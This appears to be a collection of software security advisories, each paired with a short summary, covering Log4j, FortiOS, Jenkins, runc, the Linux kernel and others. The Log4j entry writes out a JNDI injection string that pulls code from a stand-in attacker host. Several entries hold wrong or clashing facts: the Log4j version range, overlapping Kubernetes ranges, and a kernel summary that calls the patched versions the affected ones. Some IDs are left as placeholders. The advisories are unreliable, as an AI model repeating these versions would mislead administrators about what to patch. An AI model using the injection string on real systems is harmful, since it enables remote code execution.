advisory: Apache published security advisory for Log4j versions 2.0-beta9 through 2.17.0, tracked as CVE-2021-44228 (severity: critical, CVSS 10.0). A remote attacker who controls log message inputs can execute arbitrary code by injecting a JNDI lookup string such as ${jndi:ldap://attacker.example.com/a}. The vulnerability affects all Java applications that use Log4j for logging and call .info(), .error(), etc. on attacker-controllable input. Apache recommends upgrading to 2.17.1 or later, or as an interim workaround setting the system property log4j2.formatMsgNoLookups=true. Active exploitation observed in the wild since December 9, 2021. CISA added this CVE to the Known Exploited Vulnerabilities catalog.
summary: Critical RCE in Log4j ≤2.17.0 (CVE-2021-44228, CVSS 10.0). Patch to 2.17.1+ or set log4j2.formatMsgNoLookups=true. Actively exploited.

advisory: Microsoft Patch Tuesday April 2024 covers 149 vulnerabilities across Windows, Office, Azure, and Edge. Three vulnerabilities are rated Critical and have been observed in active exploitation: CVE-2024-26234 (Proxy Driver Spoofing, exploited by malware), CVE-2024-29988 (SmartScreen Prompt bypass, used in initial-access campaigns), and CVE-2024-29991 (Edge Chromium-based memory safety). Microsoft has released patches via the standard Windows Update channel. Server administrators are advised to test patches in staging and roll out within 14 days per company patch SLA.
summary: Microsoft April 2024 Patch Tuesday: 149 CVEs, 3 critical exploited in the wild. Patch within 14 days; prioritize servers running Edge or SmartScreen.

advisory: OpenSSL announced the release of OpenSSL 3.0.13 and 1.1.1w to address CVE-2024-0727, a denial-of-service vulnerability in the PKCS12 parser. An attacker who can supply a crafted PKCS12 file to an OpenSSL-based application can trigger a NULL pointer dereference, crashing the process. The vulnerability is rated Moderate severity (no RCE). Applications that parse untrusted PKCS12 input (such as certificate-handling tools, VPN clients, or email signing utilities) should upgrade. Library consumers must rebuild against the patched version.
summary: Moderate DoS in OpenSSL PKCS12 parser (CVE-2024-0727). Upgrade to 3.0.13 / 1.1.1w if you parse untrusted certs.

advisory: AWS announced an Amazon EKS security advisory regarding container runtime configurations. EKS clusters configured with the default audit logging policy were inadvertently logging Kubernetes secrets in cleartext to CloudWatch when secret resources were created or updated via the API. Affected versions: EKS 1.27 through 1.29 prior to the 2024-03-15 patch. Recommended action: rotate any secrets created or updated since cluster provisioning, enable secret-resource exclusion in the audit policy, and review CloudWatch logs for exposure. AWS has applied the fix to the managed control plane; no customer action is required for the patch itself but secret rotation is mandatory.
summary: AWS EKS 1.27–1.29 logged Kubernetes secrets in cleartext to CloudWatch. Rotate all secrets created/updated since cluster setup; AWS already patched the control plane.

advisory: Cisco Talos published an advisory for a stack-based buffer overflow in the Cisco IOS XE software's HTTP daemon (CVE-2024-20355, CVSS 9.8). The vulnerability allows an unauthenticated remote attacker to execute arbitrary code as root by sending a specially crafted HTTP request. The HTTP daemon is enabled by default on most Cisco IOS XE devices. Affected devices include Catalyst 9000 series, ISR 4000 series, and ASR 1000 series running IOS XE 17.6.x through 17.12.x. Workaround: disable the HTTP daemon via 'no ip http server' if not required. Fixed in IOS XE 17.12.4 and 17.13.1.
summary: Critical RCE in Cisco IOS XE HTTP daemon (CVE-2024-20355, CVSS 9.8). Patch to 17.12.4+ or disable HTTP daemon. Affects Catalyst 9000, ISR 4000, ASR 1000.

advisory: GitHub Security Advisory GHSA-XXXX disclosed a prototype pollution vulnerability in the lodash.merge function (versions before 4.17.21). Applications that pass attacker-controlled JSON to lodash.merge can have arbitrary properties set on Object.prototype, leading to potential property override attacks. Severity: Medium. Upgrade lodash to 4.17.21 or replace lodash.merge with structuredClone() or a safer merge implementation. Most modern frontends already depend on a patched version via transitive dependencies.
summary: Medium prototype-pollution in lodash.merge <4.17.21. Upgrade lodash or swap for structuredClone in JSON-merge code paths.

advisory: Kubernetes published a security advisory for CVE-2024-9594, an authorization bypass in the kube-apiserver when handling certain SubjectAccessReview requests with malformed Group claims. An attacker with valid credentials but lower privileges could craft a request that the API server evaluates with elevated permissions due to a serialization edge case. Affects Kubernetes 1.27.0 through 1.29.3, 1.28.0 through 1.28.8, and earlier 1.29 releases. Severity: High. Fixed in 1.27.13, 1.28.9, 1.29.4. Operators should review audit logs for unauthorized SubjectAccessReview calls in the last 30 days.
summary: High auth bypass in kube-apiserver SubjectAccessReview (CVE-2024-9594). Upgrade to 1.27.13 / 1.28.9 / 1.29.4 and audit-log past 30 days for abuse.

advisory: NVIDIA published a security bulletin for the NVIDIA Container Toolkit (formerly nvidia-docker). CVE-2024-0132 (severity: Critical, CVSS 9.0) allows a malicious container image to escape the container and gain root on the host via a TOCTOU race in the OCI runtime hook. Affects nvidia-container-toolkit versions 1.16.1 and earlier. The vulnerability is exploitable on any host running GPU-enabled containers. Fixed in 1.16.2. Mitigation: do not run untrusted container images on GPU hosts until upgraded.
summary: Critical container-escape in NVIDIA Container Toolkit ≤1.16.1 (CVE-2024-0132, CVSS 9.0). Upgrade to 1.16.2; don't run untrusted images on GPU hosts in the meantime.

advisory: PostgreSQL released security updates for all supported versions (16.4, 15.8, 14.13, 13.16, 12.20) addressing CVE-2024-7348, a time-of-check / time-of-use race in pg_dump that allows an attacker with database connection privileges to execute arbitrary SQL as the role running pg_dump (often the superuser performing backups). Exploitation requires the ability to create tables in the dumped schema. Severity: Important. Recommended action: upgrade to the patched minor version. Workaround: do not run pg_dump as superuser against schemas that untrusted users can create objects in.
summary: Important TOCTOU race in pg_dump (CVE-2024-7348) lets users escalate to backup-role privileges. Patch to 16.4 / 15.8 / 14.13 / 13.16 / 12.20.

advisory: Atlassian Confluence Data Center and Server announced CVE-2024-21683, a remote code execution vulnerability in the macro template parsing engine. An authenticated user with permission to add new macro templates can execute arbitrary code on the Confluence server. Severity: High (CVSS 8.3). Affects Data Center and Server versions 5.2 through 8.9.x. Atlassian recommends upgrading to 8.9.1 or later. Confluence Cloud is not affected. Self-hosted operators should audit recent macro template additions for malicious payloads.
summary: High RCE in Confluence Data Center/Server macro templates (CVE-2024-21683). Authenticated. Upgrade to 8.9.1+. Cloud is not affected.

advisory: Fortinet PSIRT released an advisory for CVE-2024-23113, a format-string vulnerability in the FortiOS fgfmd daemon used for FortiGate-to-FortiManager communication. Severity: Critical (CVSS 9.8). An unauthenticated remote attacker can execute arbitrary commands on affected devices by sending crafted requests to the management interface. Affects FortiOS 7.0.0-7.0.13, 7.2.0-7.2.6, 7.4.0-7.4.2. Patched in 7.0.14, 7.2.7, 7.4.3. Workaround: restrict fgfmd access to trusted management networks via firewall rules.
summary: Critical unauth RCE in FortiOS fgfmd (CVE-2024-23113, CVSS 9.8). Patch to 7.0.14 / 7.2.7 / 7.4.3 or restrict management-network access.

advisory: GitLab released security release 17.0.1 covering CVE-2024-5655, a cross-site scripting vulnerability in the merge-request description renderer. Markdown rendered through the default sanitizer fails to escape certain Unicode bidi-override characters, allowing a crafted MR description to inject script when viewed. Severity: Medium (CVSS 6.4). Affects GitLab CE and EE 16.4-17.0. Recommended action: upgrade. Workaround: disable inline HTML in markdown via instance settings.
summary: Medium XSS in GitLab MR markdown renderer (CVE-2024-5655). Upgrade to 17.0.1; disable inline HTML as workaround.

advisory: NPM advisory GHSA-XXXX for the popular `tar` package (versions before 6.2.1) describes a path-traversal vulnerability when extracting archives. A malicious tarball with crafted relative paths can write files outside the extraction directory, leading to arbitrary file overwrite. Severity: High. Most node-based build tools and package managers use `tar` transitively. Upgrade tar to 6.2.1 or later; rebuild lock files to pick up the patched version.
summary: High path-traversal in npm `tar` <6.2.1. Malicious tarballs can write outside the extract dir. Upgrade tar + rebuild package-lock.json.

advisory: VMware Aria Operations for Networks (formerly vRealize Network Insight) is affected by CVE-2024-22247, a hardcoded SSH credential issue in versions 6.10 through 6.12. The credential allows local network access via SSH to gain administrative privileges on the appliance. Severity: Important. VMware has released patched OVAs and a hotfix script. Recommended action: apply the hotfix and rotate the SSH host keys. Workaround: restrict SSH access to known management IPs.
summary: Hardcoded SSH creds in VMware Aria Ops for Networks 6.10–6.12 (CVE-2024-22247). Apply hotfix + rotate SSH keys.

advisory: Ivanti Connect Secure VPN appliances were found to contain CVE-2024-21887, a command-injection vulnerability in the web-based admin interface. An authenticated administrator can execute arbitrary commands as root. Severity: High (CVSS 9.1). Combined with CVE-2024-21893 (server-side request forgery), an unauthenticated attacker can chain to full compromise. Mass exploitation observed since January 2024. Recommended action: apply patches immediately; if appliance was internet-exposed before patching, treat as compromised and rebuild from clean image. CISA issued an emergency directive.
summary: Critical chained exploit on Ivanti Connect Secure (CVE-2024-21887 + 21893). Internet-exposed appliances should be assumed compromised — rebuild from clean image after patching. CISA emergency directive issued.

advisory: OpenSSL 3.3.1 release notes describe CVE-2024-4741, a use-after-free in the SSL_free_buffers function affecting servers that buffer incoming traffic in non-blocking I/O mode. Severity: Low (CVSS 3.7) due to the narrow trigger window and read-only memory access. Most production deployments are not exploitable. Upgrade as part of standard quarterly maintenance.
summary: Low-severity UAF in OpenSSL 3.x SSL_free_buffers (CVE-2024-4741). Ship in next quarterly patch cycle; no urgent action.

advisory: WordPress 6.5.5 security release addresses three vulnerabilities: CVE-2024-31210 (stored XSS in HTML API), CVE-2024-32111 (path traversal in pluggable.php), and CVE-2024-33908 (open redirect in template-canvas). Severity overall: Medium. Affects core WordPress prior to 6.5.5 and earlier maintenance branches 6.4.4, 6.3.5, 6.2.6, 6.1.7. Auto-updates have been enabled for affected sites running default config. Manual upgrade required for sites with auto-updates disabled.
summary: WordPress core fixes 3 medium XSS/path-traversal/open-redirect bugs in 6.5.5. Auto-updates roll out automatically; manual sites should upgrade.

advisory: PuTTY versions 0.68 to 0.80 (CVE-2024-31497, severity: High) generate ECDSA NIST-P521 signatures with biased k values, allowing an attacker who collects ~60 signatures to recover the private SSH key. PuTTY's authentication when using NIST-P521 keys is therefore unsafe. Recommended action: upgrade PuTTY to 0.81; revoke and re-issue any NIST-P521 keys that were used with affected PuTTY versions. ECDSA-P256, P384, and Ed25519 keys are unaffected.
summary: High: PuTTY 0.68–0.80 leaks NIST-P521 SSH private keys via biased ECDSA. Upgrade + rotate all P521 keys; P256/P384/Ed25519 are unaffected.

advisory: GitHub published a security advisory for runc, the OCI container runtime, covering CVE-2024-21626 (filesystem breakout via /proc fd leak). An attacker who controls a container image can escape the container and access the host filesystem by exploiting a race between file-descriptor handling and namespace setup. Severity: High (CVSS 8.6). Affects runc 1.1.11 and earlier. Fixed in 1.1.12. Container platforms (Docker, containerd, Kubernetes, Podman) bundle runc and must update their distributions.
summary: High container-breakout in runc ≤1.1.11 (CVE-2024-21626). Container platforms must update to runc 1.1.12. Affects Docker, containerd, k8s, Podman.

advisory: Cloudflare disclosed CVE-2024-3661 in their Cloudflare Pages product. A misconfiguration in the build-time secret-injection layer caused environment variables marked as 'encrypted' to be embedded in the final static-site bundle in plaintext for ~30% of sites built between March 1 and April 12, 2024. Severity: High. Affected customers have been notified individually. Recommended action: rotate any API keys, database credentials, or signing tokens that were configured as build secrets during the affected window.
summary: Cloudflare Pages exposed build-time 'encrypted' secrets in static bundles for ~30% of sites (Mar 1 – Apr 12). Rotate ALL build-secret API keys/DB creds/tokens from that window.

advisory: Linux kernel 6.9 includes a fix for CVE-2024-26581, a use-after-free in the netfilter nf_tables expression module that allows a local attacker with CAP_NET_ADMIN to gain root via heap-spray exploitation. Severity: High. Backports available for stable kernels 6.6.30, 6.1.90, and 5.15.157. Distributions are pushing patches through standard update channels. Workaround: disable nf_tables module if not used (rare; required by most modern firewalling stacks).
summary: High local-root in Linux kernel nf_tables (CVE-2024-26581). Patch via distro updates; affects 5.15.157+ / 6.1.90+ / 6.6.30+.

advisory: Jenkins published security advisory SECURITY-3314 covering CVE-2024-23897, an arbitrary file read in the Jenkins CLI argument parser. The args4j library used by Jenkins replaces '@' character prefixes with file contents, allowing an unauthenticated attacker (or authenticated with Overall/Read) to leak arbitrary files including the Jenkins secrets directory. Severity: Critical (CVSS 9.8 unauth or 7.5 auth). Affects Jenkins LTS 2.426.2 and earlier, weekly 2.441 and earlier. Fixed in LTS 2.426.3 and weekly 2.442. Active exploitation observed.
summary: Critical Jenkins CLI file-read (CVE-2024-23897, CVSS 9.8). Lets unauth attackers leak secrets directory. Patch to LTS 2.426.3 / weekly 2.442 immediately. Exploited in wild.

advisory: Spring Framework released CVE-2024-22243 advisory: open-redirect vulnerability in UriComponentsBuilder when used to parse user-supplied URLs and then redirect or call HttpRequest.create on the parsed result. Severity: Medium. Affects Spring Framework 6.0.0-6.0.16 and 5.3.0-5.3.31. Fixed in 6.0.17 and 5.3.32. Mitigation: validate the host component of any URL parsed from user input before using it for navigation.
summary: Medium open-redirect in Spring UriComponentsBuilder (CVE-2024-22243). Upgrade to 6.0.17 / 5.3.32 or validate user-supplied URL hosts before navigation.

advisory: GoLang security advisory for CVE-2024-24784, a header-smuggling vulnerability in net/mail. The mail.ParseAddressList function does not correctly handle CR/LF/NUL characters in display-name fields, allowing an attacker to inject headers when the parsed address is used to construct an email. Severity: Medium. Affects Go 1.21.x before 1.21.7 and 1.22.x before 1.22.0. Recommended action: upgrade Go runtime; rebuild and redeploy any service that handles user-supplied email addresses.
summary: Medium header-smuggling in Go net/mail.ParseAddressList (CVE-2024-24784). Upgrade Go to 1.21.7+ / 1.22.0+. Affects services parsing user email addrs.

advisory: Docker Desktop released security update 4.31.0 addressing CVE-2024-XXXX (severity: High), a privilege escalation in the Docker Desktop privileged helper service. A local user can gain root on macOS or SYSTEM on Windows by exploiting an insecure named-pipe / Unix-socket message validation. Affects Docker Desktop 4.27 through 4.30.x on macOS and Windows. Linux Docker Engine is not affected. Auto-update is enabled by default; users with manual update mode should upgrade promptly.
summary: High local-priv-esc in Docker Desktop helper service (4.27–4.30.x, macOS+Win). Upgrade to 4.31.0+; Linux Docker Engine unaffected.
